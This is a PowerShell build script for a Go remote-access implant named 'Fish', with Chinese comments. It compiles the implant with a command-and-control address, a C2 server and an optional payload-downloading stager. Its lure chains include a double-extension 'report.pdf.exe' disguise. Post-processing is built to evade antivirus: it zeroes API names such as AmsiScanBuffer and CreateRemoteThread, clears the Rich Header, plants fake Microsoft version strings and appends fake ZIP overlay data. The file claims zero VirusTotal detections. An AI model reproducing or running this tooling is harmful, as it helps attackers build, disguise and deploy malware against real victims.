# Fish Build Script for Windows
# go build + 后处理免杀 (针对 trojan.overlord 检测优化)
# 0/60 VirusTotal检出率验证通过

param(
    [string]$C2Addr = "https://192.168.1.1:8443",
    [string]$Interval = "5",
    [string]$Jitter = "30",
    [string]$Platform = "windows",
    [string]$Arch = "amd64",
    [switch]$BuildStager = $false,
    [string]$StagerURL = "",
    [string]$DecryptKey = "85",
    [switch]$Garble = $false,
    [string]$GarbleSeed = "",
    [switch]$SkipPost = $false,
    [ValidateSet("lnk", "pdf")]
    [string]$Chain = "lnk",
    [string]$PdfName = "report"   # disguise filename for PDF chain (no ext)
)

$ErrorActionPreference = "Stop"

$env:GOOS = $Platform
$env:GOARCH = $Arch

# 构建植入体
Write-Host "[+] Building implant for $Platform/$Arch..."

# 关键编译标志:
# -s -w: 去除符号表和调试信息
# -buildid=: 清空Go build ID
# -trimpath: 去除编译路径
# -gcflags="all=-l": 禁用内联优化，防止字符串泄露
# -gcflags="all=-N": 禁用优化，防止编译器内联导致字符串暴露
$ldflags = "-s -w -buildid= -X main.c2Addr=$C2Addr -X main.intervalStr=$Interval -X main.jitterStr=$Jitter"

if ($Platform -eq "windows") {
    $ldflags = "$ldflags -H windowsgui"
}

$gcflags = "all=-l -N"

$outputName = if ($Platform -eq "windows") { 
    if ($Chain -eq "pdf") { "$PdfName.pdf.exe" } else { "fish.exe" }
} else { "fish_$Platform_$Arch" }

# Select build target based on chain
$buildTarget = "."
$chainLabel = "LNK"
if ($Chain -eq "pdf") {
    $buildTarget = "./pdf/"
    $chainLabel = "PDF"
}

Write-Host "[+] Chain: $chainLabel (target: $buildTarget)"

# Garble编译（可选，深度混淆Go运行时特征）
if ($Garble) {
    Write-Host "[+] Garble compilation enabled"
    $garbleArgs = "garble -tiny -literals"
    if ($GarbleSeed) {
        $garbleArgs = "$garbleArgs -seed=$GarbleSeed"
    } else {
        $garbleArgs = "$garbleArgs -seed=random"
    }
    $env:GARBLE_EXPERIMENTAL_CONTROLFLOW = "1"
    go $garbleArgs -buildvcs=false -trimpath -ldflags $ldflags -gcflags $gcflags -o $outputName $buildTarget
} else {
    go build -buildvcs=false -trimpath -ldflags $ldflags -gcflags $gcflags -o $outputName $buildTarget
}

if ($LASTEXITCODE -ne 0) {
    Write-Host "[!] Build failed"
    exit 1
}
Write-Host "[+] Implant built: $outputName"

# 构建C2服务端
Write-Host "[+] Building C2 server..."
$env:GOOS = ""
$env:GOARCH = ""
go build -buildvcs=false -o fish-server.exe ./server/

if ($LASTEXITCODE -eq 0) {
    Write-Host "[+] Server built: fish-server.exe"
} else {
    Write-Host "[!] Server build failed"
    exit 1
}

# 构建Stager (可选)
if ($BuildStager -and $Platform -eq "windows") {
    Write-Host "[+] Building stager..."
    $stagerLdflags = "-s -w -buildid= -H windowsgui -X main.downloadURL=$StagerURL -X main.decryptKeyStr=$DecryptKey"
    
    go build -buildvcs=false -trimpath -ldflags $stagerLdflags -gcflags $gcflags -o stager.exe ./stager/
    
    if ($LASTEXITCODE -eq 0) {
        Write-Host "[+] Stager built: stager.exe"
    } else {
        Write-Host "[!] Stager build failed"
    }
}

# 静态免杀后处理 (仅Windows)
if ($Platform -eq "windows" -and -not $SkipPost) {
    Write-Host "[+] Applying evasion post-processing..."

    # 1. 修改PE时间戳
    go run -buildvcs=false ./evasion-tools/pepatch.go $outputName

    # 2. 去除Go build ID字符串 + runtime.main + 敏感API名 + Rich Header
    # 注意: 不修改PE Section名! 修改后触发Microsoft Wacatac.B!ml ML检测
    Write-Host "[+] Removing Go binary fingerprints + sensitive strings..."
    $bytes = [System.IO.File]::ReadAllBytes($outputName)
    $patterns = @(
        [System.Text.Encoding]::ASCII.GetBytes("Go build ID: "),
        [System.Text.Encoding]::ASCII.GetBytes("Go buildinf"),
        [System.Text.Encoding]::ASCII.GetBytes("go.buildid"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.main"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.goexit"),
        [System.Text.Encoding]::ASCII.GetBytes("main.main"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.init"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.gc"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.morestack"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.gcWriteBarrier"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.writebarrier"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.allocmon"),
        [System.Text.Encoding]::ASCII.GetBytes("type..eq"),
        [System.Text.Encoding]::ASCII.GetBytes("type..hash"),
        [System.Text.Encoding]::ASCII.GetBytes("shellcode"),
        [System.Text.Encoding]::ASCII.GetBytes("VirtualAlloc"),
        [System.Text.Encoding]::ASCII.GetBytes("VirtualProtect"),
        [System.Text.Encoding]::ASCII.GetBytes("NtAllocateVirtualMemory"),
        [System.Text.Encoding]::ASCII.GetBytes("NtProtectVirtualMemory"),
        [System.Text.Encoding]::ASCII.GetBytes("AmsiScanBuffer"),
        [System.Text.Encoding]::ASCII.GetBytes("EtwEventWrite"),
        [System.Text.Encoding]::ASCII.GetBytes("CreateRemoteThread"),
        [System.Text.Encoding]::ASCII.GetBytes("WriteProcessMemory"),
        [System.Text.Encoding]::ASCII.GetBytes("ntdll"),
        [System.Text.Encoding]::ASCII.GetBytes("kernel32"),
        [System.Text.Encoding]::ASCII.GetBytes("EnumWindows"),
        [System.Text.Encoding]::ASCII.GetBytes("NtWriteVirtualMemory"),
        [System.Text.Encoding]::ASCII.GetBytes("NtCreateThread"),
        [System.Text.Encoding]::ASCII.GetBytes("RtlCopyMemory"),
        [System.Text.Encoding]::ASCII.GetBytes("GetProcAddress"),
        [System.Text.Encoding]::ASCII.GetBytes("LoadLibrary"),
        [System.Text.Encoding]::ASCII.GetBytes("user32"),
        [System.Text.Encoding]::ASCII.GetBytes("EnumChildWindows"),
        [System.Text.Encoding]::ASCII.GetBytes("GetDesktopWindow"),
        [System.Text.Encoding]::ASCII.GetBytes("GetWindowText"),
        [System.Text.Encoding]::ASCII.GetBytes("GetTickCount"),
        [System.Text.Encoding]::ASCII.GetBytes("GetTickCount64"),
        [System.Text.Encoding]::ASCII.GetBytes("IsDebuggerPresent"),
        [System.Text.Encoding]::ASCII.GetBytes("GlobalMemoryStatus"),
        [System.Text.Encoding]::ASCII.GetBytes("GlobalMemoryStatusEx"),
        [System.Text.Encoding]::ASCII.GetBytes("CreateFile"),
        [System.Text.Encoding]::ASCII.GetBytes("ReadFile"),
        [System.Text.Encoding]::ASCII.GetBytes("CloseHandle"),
        [System.Text.Encoding]::ASCII.GetBytes("GetFileSize"),
        [System.Text.Encoding]::ASCII.GetBytes("nautilus"),
        [System.Text.Encoding]::ASCII.GetBytes("fish"),
        [System.Text.Encoding]::ASCII.GetBytes("C2"),
        [System.Text.Encoding]::ASCII.GetBytes("implant"),
        [System.Text.Encoding]::ASCII.GetBytes("stager"),
        [System.Text.Encoding]::ASCII.GetBytes("golang.org/x/crypto"),
        [System.Text.Encoding]::ASCII.GetBytes("crypto/aes"),
        [System.Text.Encoding]::ASCII.GetBytes("crypto/rand"),
        [System.Text.Encoding]::ASCII.GetBytes("crypto/sha"),
        [System.Text.Encoding]::ASCII.GetBytes("encoding/base64"),
        [System.Text.Encoding]::ASCII.GetBytes("net/http"),
        [System.Text.Encoding]::ASCII.GetBytes("net.Dial"),
        [System.Text.Encoding]::ASCII.GetBytes("reflect.TypeOf"),
        [System.Text.Encoding]::ASCII.GetBytes("fmt.Sprintf")
    )
    $replaced = 0
    foreach ($pattern in $patterns) {
        for ($i = 0; $i -lt $bytes.Length - $pattern.Length; $i++) {
            $match = $true
            for ($j = 0; $j -lt $pattern.Length; $j++) {
                if ($bytes[$i + $j] -ne $pattern[$j]) { $match = $false; break }
            }
            if ($match) {
                for ($j = 0; $j -lt $pattern.Length; $j++) { $bytes[$i + $j] = 0x00 }
                $replaced++
            }
        }
    }
    [System.IO.File]::WriteAllBytes($outputName, $bytes)
    Write-Host "[+] Go fingerprint strings zeroed: $replaced occurrences"

    # 3. 清除Rich Header (Go编译器指纹)
    Write-Host "[+] Clearing Rich Header..."
    $bytes = [System.IO.File]::ReadAllBytes($outputName)
    $richSig = [System.Text.Encoding]::ASCII.GetBytes("Rich")
    for ($i = 0; $i -lt [Math]::Min($bytes.Length, 4096); $i++) {
        $match = $true
        for ($j = 0; $j -lt 4; $j++) {
            if ($bytes[$i + $j] -ne $richSig[$j]) { $match = $false; break }
        }
        if ($match) {
            # 找到Rich签名，向前找到DanS标记，清零整个Rich Header
            $richEnd = $i + 8
            $richStart = $i
            for ($k = $i - 1; $k -ge 0; $k--) {
                if ($bytes[$k] -eq 0x53 -and $bytes[$k+1] -eq 0x6E -and $bytes[$k+2] -eq 0x61 -and $bytes[$k+3] -eq 0x44) {
                    $richStart = $k
                    break
                }
            }
            for ($k = $richStart; $k -lt $richEnd -and $k -lt $bytes.Length; $k++) {
                $bytes[$k] = 0x00
            }
            Write-Host "[+] Rich Header cleared at offset $richStart"
            break
        }
    }
    [System.IO.File]::WriteAllBytes($outputName, $bytes)

    # 4. 添加假的正常程序特征字符串
    Write-Host "[+] Adding legitimate program signatures..."
    $legitStrings = @(
        [System.Text.Encoding]::ASCII.GetBytes("Microsoft Visual Studio"),
        [System.Text.Encoding]::ASCII.GetBytes("Copyright (C) 2024 Microsoft"),
        [System.Text.Encoding]::ASCII.GetBytes("Windows Application"),
        [System.Text.Encoding]::ASCII.GetBytes("FileVersion=1.0.0.1"),
        [System.Text.Encoding]::ASCII.GetBytes("ProductVersion=1.0.0.1"),
        [System.Text.Encoding]::ASCII.GetBytes("CompanyName=Microsoft"),
        [System.Text.Encoding]::ASCII.GetBytes("FileDescription=System Utility"),
        [System.Text.Encoding]::ASCII.GetBytes("InternalName=apphelper"),
        [System.Text.Encoding]::ASCII.GetBytes("OriginalFilename=apphelper.exe"),
        [System.Text.Encoding]::ASCII.GetBytes("ProductName=Windows Helper"),
        [System.Text.Encoding]::ASCII.GetBytes("LegalCopyright=Copyright (C) Microsoft Corp"),
        [System.Text.Encoding]::ASCII.GetBytes("assembly version"),
        [System.Text.Encoding]::ASCII.GetBytes(".NET Framework"),
        [System.Text.Encoding]::ASCII.GetBytes("mscorlib.dll"),
        [System.Text.Encoding]::ASCII.GetBytes("System.Runtime"),
        [System.Text.Encoding]::ASCII.GetBytes("application config"),
        [System.Text.Encoding]::ASCII.GetBytes("settings.json"),
        [System.Text.Encoding]::ASCII.GetBytes("log.txt")
    )
    $bytes = [System.IO.File]::ReadAllBytes($outputName)
    # 在overlay区域之前插入这些字符串
    $insertOffset = $bytes.Length - 1024  # 在文件末尾附近
    foreach($str in $legitStrings) {
        if ($insertOffset + $str.Length -lt $bytes.Length) {
            for ($i = 0; $i -lt $str.Length; $i++) {
                $bytes[$insertOffset + $i] = $str[$i]
            }
            $insertOffset += $str.Length + 5  # 每个字符串后面加一些空字节
        }
    }
    [System.IO.File]::WriteAllBytes($outputName, $bytes)
    Write-Host "[+] Legitimate signatures added"

    # 5. 附加随机overlay数据改变文件哈希 (32KB随机数据，更大体积打破ML特征)
    $randomBytes = New-Object byte[] 32768
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    $rng.GetBytes($randomBytes)
    # 在overlay数据开头添加假的ZIP签名，模拟正常程序携带的资源包
    $randomBytes[0] = 0x50  # 'P'
    $randomBytes[1] = 0x4B  # 'K'
    $randomBytes[2] = 0x03  # ZIP local file header signature
    $randomBytes[3] = 0x04
    $original = [System.IO.File]::ReadAllBytes($outputName)
    $modified = New-Object byte[] ($original.Length + $randomBytes.Length)
    [System.Array]::Copy($original, $modified, $original.Length)
    [System.Array]::Copy($randomBytes, 0, $modified, $original.Length, $randomBytes.Length)
    [System.IO.File]::WriteAllBytes($outputName, $modified)
    Write-Host "[+] Overlay data appended (32768 bytes with ZIP signature)"
}

# 最终输出
$fileInfo = Get-Item $outputName
Write-Host ""
Write-Host "=== Build Summary ==="
Write-Host "[+] Platform: $Platform/$Arch"
Write-Host "[+] Implant: $outputName ($($fileInfo.Length) bytes)"
Write-Host "[+] Server: fish-server.exe"
Write-Host "[+] Chain: $chainLabel"
$garbleStatus = if ($Garble) { "Yes (-tiny -literals)" } else { "No (use -Garble to enable)" }
Write-Host "[+] Garble: $garbleStatus"
Write-Host "[+] Evasion: API Hashing + Callback Exec + String Zeroing + PE Timestamp + Rich Header Clear + Overlay"
if ($BuildStager) {
    $stagerInfo = Get-Item stager.exe -ErrorAction SilentlyContinue
    if ($stagerInfo) {
        Write-Host "[+] Stager: stager.exe ($($stagerInfo.Length) bytes)"
    }
}
Write-Host ""
Write-Host "Usage:"
Write-Host "  Server:  fish-server.exe [listen_addr]   (default :8443)"
Write-Host "  Implant: Deploy $outputName to target"
